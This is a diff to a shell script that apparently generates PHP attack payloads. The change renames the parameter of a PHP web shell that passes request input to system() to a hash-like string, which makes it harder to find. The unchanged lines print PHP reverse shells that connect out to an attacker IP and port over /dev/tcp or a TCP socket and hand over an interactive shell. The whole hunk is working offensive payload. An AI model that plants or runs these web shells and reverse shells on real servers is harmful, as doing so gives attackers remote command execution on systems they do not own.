@@ -26,7 +26,7 @@ if [[ "$1" == "bash" ]]; then
 elif [[ "$1" == "php" ]]; then
     echo -e "\n${BLUE}[+]${ENDCOLOR} PHP shell payloads generated:\n"
 
-    echo -e "\t${YELLOW}-${ENDCOLOR} <?php if(isset(\$_REQUEST[\"cmd\"])){ echo \"<pre>\"; \$cmd = (\$_REQUEST[\"cmd\"]); system(\$cmd); echo \"</pre>\"; die; }?>"
+    echo -e "\t${YELLOW}-${ENDCOLOR} <?php if(isset(\$_REQUEST[\"adda0a3d99480e6c29b065b1b0cd5319\"])){ echo \"<pre>\"; \$cmd = (\$_REQUEST[\"adda0a3d99480e6c29b065b1b0cd5319\"]); system(\$cmd); echo \"</pre>\"; die; }?>"
     echo -e "\t${YELLOW}-${ENDCOLOR} <?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$IP/$2 0>&1'\");"
     echo -e "\t${YELLOW}-${ENDCOLOR} <?php \$s = stream_socket_client(\"tcp://$IP:$2\"); proc_open(\"/bin/sh -i\", [0=>\$s,1=>\$s,2=>\$s],\$pipes);?>"
 
